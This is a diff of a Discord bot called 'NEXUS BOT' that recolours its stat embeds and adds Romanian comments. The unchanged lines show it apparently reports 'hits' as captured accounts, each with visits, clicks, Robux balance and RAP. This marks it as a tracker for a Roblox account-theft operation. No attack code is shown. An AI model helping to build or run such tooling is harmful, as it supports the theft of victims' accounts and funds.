@@ -59,7 +59,7 @@ setInterval(async () => {
       const channel = client.channels.cache.get(STATUS_CHANNEL_ID);
       if (channel) {
         const embed = new EmbedBuilder()
-          .setColor(0x000000)
+          .setColor(0x000000) // border negru
           .setThumbnail("") // gol
           .setDescription(
             `-- **NEXUS BOT** --\n\n` +
@@ -106,7 +106,7 @@ client.on('messageCreate', async (message) => {
       const userName = profile.userName || targetUser.username;
 
       const embed = new EmbedBuilder()
-        .setColor(0x800080)
+        .setColor(0x000000) // negru
         .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
         .setDescription(`-- **NEXUS BOT** --\n\n**User:** ${userName}\n\n**TOTAL STATS:**\nHits: ${formatNumber(normal.Totals?.Accounts)}\nVisits: ${formatNumber(normal.Totals?.Visits)}\nClicks: ${formatNumber(normal.Totals?.Clicks)}\n\n**BIGGEST HIT:**\nSummary: ${formatNumber(normal.Highest?.Summary)}\nRAP: ${formatNumber(normal.Highest?.Rap)}\nRobux: ${formatNumber(normal.Highest?.Balance)}\n\n**TOTAL HIT STATS:**\nSummary: ${formatNumber(normal.Totals?.Summary)}\nRAP: ${formatNumber(normal.Totals?.Rap)}\nRobux: ${formatNumber(normal.Totals?.Balance)}`)
         .setImage("https://i.imgur.com/qxSArud.gif")
@@ -131,7 +131,7 @@ client.on('messageCreate', async (message) => {
       const userName = profile.userName || targetUser.username;
 
       const embed = new EmbedBuilder()
-        .setColor(0x800080)
+        .setColor(0x000000)
         .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
         .setDescription(`-- **NEXUS BOT** --\n\n**User:** ${userName}\n\n**DAILY STATS:**\nHits: ${formatNumber(daily.Totals?.Accounts)}\nVisits: ${formatNumber(daily.Totals?.Visits)}\nClicks: ${formatNumber(daily.Totals?.Clicks)}\n\n**BIGGEST HIT:**\nSummary: ${formatNumber(daily.Highest?.Summary)}\nRAP: ${formatNumber(daily.Highest?.Rap)}\nRobux: ${formatNumber(daily.Highest?.Balance)}\n\n**TOTAL HIT STATS:**\nSummary: ${formatNumber(daily.Totals?.Summary)}\nRAP: ${formatNumber(daily.Totals?.Rap)}\nRobux: ${formatNumber(daily.Totals?.Balance)}`)
         .setImage("https://i.imgur.com/qxSArud.gif")
